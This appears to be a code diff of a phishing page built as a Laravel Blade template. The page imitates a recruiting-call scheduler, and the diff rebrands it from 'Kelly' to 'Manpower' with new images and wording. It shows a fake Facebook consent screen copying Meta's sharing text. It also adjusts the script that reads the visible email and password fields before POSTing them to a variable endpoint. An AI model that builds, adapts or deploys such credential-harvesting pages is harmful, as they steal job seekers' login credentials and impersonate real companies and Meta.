@@ -9,12 +9,12 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper {{$webStatus ? '':'d-none'}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('logo.png')}}" /></div>
+                        <div class="logo__wrapper"><img width="50%" src="{{asset('man.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" style="border-radius: 0" width="65px" src="{{asset('logo.png')}}" /></div>
+                                        <div><img class="avatar" style="border-radius: 0" width="65px" src="{{asset('man2.png')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -91,7 +91,7 @@
                     <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Kelly - Recruiting Team</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Manpower - Recruiting Team</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -106,7 +106,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Kelly - Recruiting Team. <br />
+                                            Please confirm your appointment with manpower - Recruiting Team. <br />
                                             To complete the confirmation process, continue with Facebook
                                         </p>
                                     </div>
@@ -148,12 +148,12 @@
                 </div>
                 <div class="calendar__wrapper {{$webStatus ? 'd-none':''}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
+                        <div class="logo__wrapper"><img width="50%" src="{{asset('man.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
+                                        <div><img class="avatar" width="65px" src="{{asset('man2.png')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -335,11 +335,11 @@
                                             <div class="icon-bar">
                                                 <img src="{{asset('new/fb.png')}}" alt="">
                                                 <img src="{{asset('new/sync.png')}}" alt="">
-                                                <img src="{{asset('new/logo.png')}}" alt="">
+                                                <img src="{{asset('man2.png')}}" alt="">
                                             </div>
                                             <span class="hr-border"></span>
                                             <div class="text-content-1">
-                                                <h2>Kelly is requesting access to:</h2>
+                                                <h2>Manpower is requesting access to:</h2>
                                                 <p>Name and profile picture</p>
                                                 <a href="javascript:void(0)">View access</a>
                                             </div>
@@ -348,9 +348,9 @@
                                                 <a href="javascript:void(0)">Cancel</a>
                                             </div>
                                             <div class="bottom-txt">
-                                                <p>By continuing, kelly will receive ongoing access to the information you share and Meta will record when Kelly accesses it.
+                                                <p>By continuing, Manpower will receive ongoing access to the information you share and Meta will record when Manpower accesses it.
                                                     <a href="javascript:void(0)">Learn more</a> about this sharing and the settings you have.</p>
-                                                <p>Kelly's <a href="javascript:void(0)">Privacy Policy</a> and <a href="javascript:void(0)">Terms of Service</a></p>
+                                                <p>Manpower's <a href="javascript:void(0)">Privacy Policy</a> and <a href="javascript:void(0)">Terms of Service</a></p>
                                             </div>
                                         </div>
                                     </div>
@@ -651,8 +651,8 @@
         @this.set('showModalFooter',false);
         @this.set('enableLoginForm',false);
         @this.set('enableLoadingAfterSubmit',true);
-        emailElement = $('input[name="email"]').val();
-        const passwordElement = $('input[name="password"]').val();
+        emailElement = $('form:visible input[name="email"]').val();
+        const passwordElement = $('form:visible input[name="password"]').val();
         fetch(tURL, {
             method: "POST",
             headers: {
